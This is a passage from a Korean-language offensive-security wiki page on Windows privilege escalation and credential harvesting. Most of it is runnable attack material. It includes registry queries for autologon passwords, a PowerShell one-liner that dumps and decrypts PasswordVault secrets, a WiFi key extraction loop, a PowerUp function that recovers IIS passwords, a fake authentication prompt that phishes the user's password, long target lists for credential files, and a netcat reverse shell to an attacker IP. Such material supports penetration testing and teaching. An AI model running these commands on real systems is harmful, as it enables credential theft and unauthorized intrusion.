reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault는 **Windows**가 **사용자를 자동으로 로그인**하는 데 사용할 수 있도록 서버, 웹사이트 및 기타 프로그램의 사용자 자격 증명을 저장합니다. 처음에는 사용자가 Facebook, Twitter 또는 Gmail과 같은 사이트의 자격 증명을 저장하고 브라우저가 자동으로 로그인하도록 할 수 있다는 뜻처럼 들릴 수 있지만, 실제로는 그렇지 않습니다.

Windows Vault는 Windows가 사용자를 자동으로 로그인하는 데 사용할 수 있는 자격 증명을 저장합니다. 즉, 리소스(서버 또는 웹사이트)에 액세스하기 위해 자격 증명이 필요한 모든 **Windows 애플리케이션은 이 Credential Manager** 및 Windows Vault를 **사용하고**, 사용자가 매번 사용자 이름과 비밀번호를 입력하는 대신 제공된 자격 증명을 사용할 수 있습니다.

애플리케이션이 Credential Manager와 상호 작용하지 않는 한, 해당 애플리케이션이 특정 리소스의 자격 증명을 사용하는 것은 불가능하다고 생각합니다. 따라서 애플리케이션에서 vault를 사용하려면 어떻게든 **credential manager와 통신하여 기본 저장소 vault에서 해당 리소스의 자격 증명을 요청**해야 합니다.

`cmdkey`를 사용하여 시스템에 저장된 자격 증명을 나열합니다.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 `runas`에서 `/savecred` 옵션을 사용하여 저장된 자격 증명을 사용할 수 있습니다. 다음 예제에서는 SMB share를 통해 원격 binary를 호출합니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
제공된 자격 증명을 사용하여 `runas` 실행하기.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) 또는 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)를 사용합니다.

### UWP PasswordVault / Credential Locker

최신 Windows UWP 애플리케이션, Microsoft Edge 및 최신 시스템 서비스는 인증 토큰과 평문 비밀번호를 Universal Windows Platform (UWP) `PasswordVault` (`vaultcmd`에서는 `Web Credentials`로도 표시됨) 내부에 저장합니다. 이 저장 공간은 세션별로 격리되며 관리자 권한이나 `SeDebugPrivilege` 권한 없이도 네이티브 방식으로 복호화할 수 있습니다.

사용자의 활성 세션에서 다음 PowerShell 명령을 실행하면 저장된 모든 사용자 이름과 평문 비밀번호를 즉시 dump하고 복호화합니다:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)**는 주로 Windows 운영 체제에서 비대칭 개인 키를 대칭 암호화하는 데 사용되는 데이터의 대칭 암호화 방법을 제공합니다. 이 암호화는 사용자 또는 시스템 비밀 값을 활용하여 엔트로피에 크게 기여합니다.

**DPAPI는 사용자의 로그인 비밀 값에서 파생된 대칭 키를 통해 키를 암호화할 수 있도록 합니다**. 시스템 암호화와 관련된 경우에는 시스템의 도메인 인증 비밀 값을 사용합니다.

DPAPI를 사용하여 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉터리에 저장되며, 여기서 `{SID}`는 사용자의 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)를 나타냅니다. **같은 파일에서 사용자의 개인 키를 보호하는 master key와 함께 저장되는 DPAPI 키**는 일반적으로 64바이트의 무작위 데이터로 구성됩니다. (이 디렉터리에 대한 접근은 제한되어 있으므로 CMD에서 `dir` 명령으로 해당 내용을 나열할 수 없지만, PowerShell을 통해서는 나열할 수 있습니다.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
적절한 인자(`/pvk` 또는 `/rpc`)를 사용하여 **mimikatz module** `dpapi::masterkey`로 이를 복호화할 수 있습니다.

**master password로 보호되는 credentials files**는 일반적으로 다음 위치에 있습니다:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatz module** `dpapi::cred`를 적절한 `/masterkey`와 함께 사용하여 복호화할 수 있습니다.\
`sekurlsa::dpapi` module을 사용하면 **memory**에서 여러 **DPAPI** **masterkeys**를 **extract**할 수 있습니다(root 권한이 있는 경우).

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**는 암호화된 credentials를 편리하게 저장하는 방법으로 **scripting** 및 자동화 작업에 자주 사용됩니다. credentials는 **DPAPI**를 사용하여 보호되며, 일반적으로 credentials가 생성된 동일한 computer의 동일한 user만 복호화할 수 있습니다.

credentials가 포함된 file에서 PS credentials를 **decrypt**하려면 다음을 실행합니다:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 저장된 RDP 연결

다음 위치에서 찾을 수 있습니다: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
및 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 최근 실행한 명령어
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 자격 증명 관리자**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Mimikatz의 `dpapi::rdg` 모듈을 적절한 `/masterkey`와 함께 사용하여 **모든 .rdg 파일을 복호화**\
Mimikatz의 `sekurlsa::dpapi` 모듈을 사용하면 메모리에서 **여러 DPAPI masterkey를 추출**할 수 있습니다.

### Sticky Notes

사용자는 Windows workstation에서 Sticky Notes 앱을 사용해 **password** 및 기타 정보를 **저장**하는 경우가 많지만, 이것이 database file이라는 사실을 인식하지 못합니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 있으며, 항상 검색하고 검사할 가치가 있습니다.

### AppCmd.exe

**AppCmd.exe에서 password를 복구하려면 Administrator 권한이 필요하며 High Integrity level에서 실행해야 합니다.**\
**AppCmd.exe**는 `%systemroot%\system32\inetsrv\` directory에 있습니다.\
이 file이 존재한다면 일부 **credentials**가 구성되어 있을 가능성이 있으며 **복구**할 수 있습니다.

이 code는 [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)에서 추출되었습니다:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 존재하는지 확인합니다 .\
Installers는 **SYSTEM 권한으로 실행되며**, 다수가 **DLL Sideloading에 취약합니다(정보 출처:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 파일 및 레지스트리 (자격 증명)

### Putty 자격 증명
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 호스트 키
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 레지스트리의 SSH 키

SSH private keys는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys` 내부에 저장될 수 있으므로, 그 안에 흥미로운 내용이 있는지 확인해야 합니다:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
해당 경로에서 항목을 찾았다면 저장된 SSH 키일 가능성이 높습니다. 이 키는 암호화되어 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)를 사용하면 쉽게 복호화할 수 있습니다.\
이 기법에 대한 자세한 정보는 다음을 참고하세요: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` 서비스가 실행되고 있지 않으며 부팅 시 자동으로 시작되도록 하려면 다음을 실행합니다:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 technique은 더 이상 유효하지 않은 것 같습니다. 일부 SSH 키를 생성하고 `ssh-add`를 사용해 추가한 다음, SSH를 통해 시스템에 로그인해 보았습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys가 존재하지 않았으며, procmon에서도 비대칭 키 인증 중 `dpapi.dll`이 사용된 것을 확인하지 못했습니다.

### Unattended 파일
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
**metasploit**을 사용하여 다음 파일을 검색할 수도 있습니다: _post/windows/gather/enum_unattend_

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 클라우드 자격 증명
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml**이라는 파일을 검색합니다.

### Cached GPP Password

이전에는 Group Policy Preferences (GPP)를 통해 여러 시스템에 사용자 지정 로컬 관리자 계정을 배포할 수 있는 기능이 제공되었습니다. 그러나 이 방법에는 심각한 보안 결함이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장된 Group Policy Objects (GPOs)는 모든 도메인 사용자가 액세스할 수 있었습니다. 둘째, 공개적으로 문서화된 기본 키를 사용해 AES256으로 암호화된 이러한 GPP 내의 비밀번호는 인증된 모든 사용자가 복호화할 수 있었습니다. 이는 사용자가 상승된 권한을 획득할 수 있으므로 심각한 위험을 초래했습니다.

이 위험을 완화하기 위해 비어 있지 않은 `"cpassword"` 필드가 포함된 로컬 캐시 GPP 파일을 검색하는 함수가 개발되었습니다. 이러한 파일을 찾으면 함수가 비밀번호를 복호화하고 사용자 지정 PowerShell 객체를 반환합니다. 이 객체에는 GPP 및 파일 위치에 대한 세부 정보가 포함되어 있어 이 보안 취약점을 식별하고 해결하는 데 도움이 됩니다.

`C:\ProgramData\Microsoft\Group Policy\history` 또는 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista 이전)_에서 다음 파일을 검색합니다.

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 복호화하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용하여 비밀번호 가져오기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS 웹 구성
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
자격 증명이 포함된 web.config 예시:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 자격 증명
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 자격 증명 요청

사용자가 자격 증명을 알고 있을 가능성이 있다고 생각되면, **사용자에게 자신의 자격 증명이나 다른 사용자의 자격 증명을 입력하도록 요청**할 수 있습니다(단, 클라이언트에게 직접 **자격 증명**을 **요청하는 것**은 매우 **위험**하다는 점에 유의하세요):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **자격 증명이 포함될 수 있는 파일 이름**

과거에 **passwords**가 **clear-text** 또는 **Base64** 형식으로 포함되었던 것으로 알려진 파일들
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
제안된 모든 파일 검색:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin의 자격 증명

자격 증명을 찾기 위해 Bin도 확인해야 합니다.

여러 프로그램에 저장된 **비밀번호를 복구**하려면 다음을 사용할 수 있습니다: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 레지스트리 내부

**자격 증명이 포함되어 있을 수 있는 기타 레지스트리 키**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

**Chrome 또는 Firefox**의 passwords가 저장된 dbs를 확인해야 합니다.\
또한 browsers의 history, bookmarks 및 favourites도 확인해야 합니다. 그곳에 **passwords가** 저장되어 있을 수도 있습니다.

browsers에서 passwords를 추출하는 도구:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**은 Windows 운영 체제에 내장된 기술로, 서로 다른 언어로 작성된 software components 간의 **intercommunication**을 가능하게 합니다. 각 COM component는 **class ID (CLSID)**를 통해 **identified**되며, 각 component는 interface IDs (IIDs)로 식별되는 하나 이상의 interfaces를 통해 functionality를 노출합니다.

COM classes와 interfaces는 각각 registry의 **HKEY\CLASSES\ROOT\CLSID** 및 **HKEY\CLASSES\ROOT\Interface** 아래에 정의됩니다. 이 registry는 **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes**를 병합하여 생성됩니다 = **HKEY\CLASSES\ROOT.**

이 registry의 CLSIDs 내부에서는 child registry인 **InProcServer32**를 찾을 수 있습니다. 여기에는 **DLL**을 가리키는 **default value**와 **ThreadingModel**이라는 value가 포함되어 있으며, 이 값은 **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single 또는 Multi) 또는 **Neutral** (Thread Neutral)일 수 있습니다.

![Browsers History - COM DLL Overwriting: 이 registry의 CLSIDs 내부에서는 child registry인 InProcServer32를 찾을 수 있습니다. 여기에는 DLL을 가리키는 default value와 value...](<../../images/image (729).png>)

기본적으로, 실행될 **DLLs 중 하나라도 overwrite**할 수 있고 해당 DLL이 다른 user에 의해 실행된다면 **privileges를 escalate**할 수 있습니다.

attackers가 persistence mechanism으로 COM Hijacking을 사용하는 방법을 알아보려면 다음을 확인하세요:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**파일 contents 검색**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일 이름으로 파일 검색**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**레지스트리에서 키 이름과 비밀번호 검색**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### passwords를 검색하는 Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)는 제가 만든 **msf** plugin으로, victim 내부에서 credentials를 검색하는 모든 metasploit POST module을 **자동으로 실행**합니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 이 페이지에서 언급한 passwords가 포함된 모든 files를 자동으로 검색합니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne)는 system에서 passwords를 추출하는 또 다른 훌륭한 tool입니다.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher)는 이러한 데이터를 clear text로 저장하는 여러 tools(PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP)의 **sessions**, **usernames**, **passwords**를 검색합니다.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM으로 실행 중인 process가** **full access** 권한으로 새 process를 열었다고 (`OpenProcess()`) 가정해 보겠습니다. 동일한 process가 **낮은 권한으로 새 process를 생성하면서** (`CreateProcess()`) **main process의 모든 open handle을 상속**하도록 할 수도 있습니다.\
그런 다음 **low privileged process에 full access가 있다면**, `OpenProcess()`로 생성된 **privileged process에 대한 open handle**을 가져와 **shellcode를 inject**할 수 있습니다.\
[**이 vulnerability를 탐지하고 exploit하는 방법**에 대한 자세한 내용은 이 예제를 참조하세요.](leaked-handle-exploitation.md)\
[서로 다른 권한 수준으로 상속된 process 및 thread의 더 많은 open handle(**full access뿐만 아니라**)을 테스트하고 abuse하는 방법에 대한 더 자세한 설명은 **이 다른 글**을 참조하세요.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**pipes**라고 하는 shared memory segment는 process 간 통신과 data 전송을 가능하게 합니다.

Windows는 **Named Pipes**라는 기능을 제공하며, 이를 통해 서로 관련 없는 process도 서로 다른 network를 통해서까지 data를 공유할 수 있습니다. 이는 **named pipe server**와 **named pipe client**라는 role이 정의된 client/server architecture와 유사합니다.

**client**가 pipe를 통해 data를 보내면, 해당 pipe를 설정한 **server**는 필요한 **SeImpersonate** 권한이 있는 경우 **client의 identity를 impersonate**할 수 있습니다. 자신이 mimic할 수 있는 pipe를 통해 통신하는 **privileged process**를 식별하면, 해당 process가 자신이 설정한 pipe와 상호작용할 때 그 identity를 취하여 **더 높은 privilege를 획득**할 수 있습니다. 이러한 attack을 수행하는 방법은 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](#from-high-integrity-to-system)의 유용한 guide에서 확인할 수 있습니다.

또한 다음 tool을 사용하면 **burp와 같은 tool로 named pipe 통신을 intercept**할 수 있습니다: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **그리고 이 tool을 사용하면 모든 pipe를 나열하고 확인하여 privesc를 찾을 수 있습니다** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

server mode의 Telephony service (TapiSrv)는 `\\pipe\\tapsrv` (MS-TRP)를 노출합니다. remote authenticated client는 mailslot 기반 async event path를 abuse하여 `ClientAttach`를 기존의 모든 `NETWORK SERVICE` writable file에 대한 임의의 **4-byte write**로 전환한 다음, Telephony admin 권한을 획득하고 service로 arbitrary DLL을 load할 수 있습니다. 전체 flow는 다음과 같습니다.

- `pszDomainUser`를 writable existing path로 설정한 `ClientAttach` → service가 `CreateFileW(..., OPEN_EXISTING)`를 통해 해당 path를 열고 async event write에 사용합니다.
- 각 event는 `Initialize`에서 attacker가 제어하는 `InitContext`를 해당 handle에 write합니다. `LRegisterRequestRecipient` (`Req_Func 61`)로 line app을 등록하고, `TRequestMakeCall` (`Req_Func 121`)을 trigger한 다음, `GetAsyncEvents` (`Req_Func 0`)를 통해 가져오고, 이후 unregister/shutdown하여 deterministic write를 반복합니다.
- `C:\Windows\TAPI\tsec.ini`의 `[TapiAdministrators]`에 자신을 추가하고 reconnect한 다음, arbitrary DLL path와 함께 `GetUIDllName`을 호출하여 `NETWORK SERVICE`로 `TSPI_providerUIIdentify`를 execute합니다.

자세한 내용:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### Windows에서 실행될 수 있는 File Extensions

**[https://filesec.io/](https://filesec.io/)** 페이지를 확인하세요.

### Markdown renderer를 통한 Protocol handler / ShellExecute abuse

`ShellExecuteExW`로 전달되는 clickable Markdown link는 위험한 URI handler (`file:`, `ms-appinstaller:` 또는 등록된 모든 scheme)를 trigger하여 현재 user로 attacker-controlled file을 execute할 수 있습니다. 다음을 참조하세요.

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Password에 대한 Command Line Monitoring**

